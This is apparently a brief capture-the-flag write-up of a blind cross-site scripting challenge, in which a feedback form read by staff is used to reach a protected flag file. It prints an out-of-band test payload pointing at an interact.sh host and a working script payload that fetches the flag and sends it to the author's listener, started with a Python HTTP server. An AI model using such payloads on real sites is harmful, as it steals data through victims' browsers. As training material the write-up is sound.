The /flag.txt gives a 401 unauthorized error. There's a submit feedback endpoint that suggests that staff will interact with our input.

I had to check the walkthrough. Turns out its Blind XSS. We can test for presence of Blind XSS using an OOB interaction with Interact.sh with the following payload :

```js
'"><script src=http://cumsc1ff3mbh3u2l0v10c6ipgf4cgyb1k.oast.live></script>
```

I get a DNS lookup. Next I have to figure out how to send the flag content to myself.

Have to use JavaScript and a Python HTTP server to obtain the flag :

```js
'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.4.122.80:8000/?flag=' + encodeURIComponent(data));
    });
</script>
```

```
‚ùØ python3 -m http.server
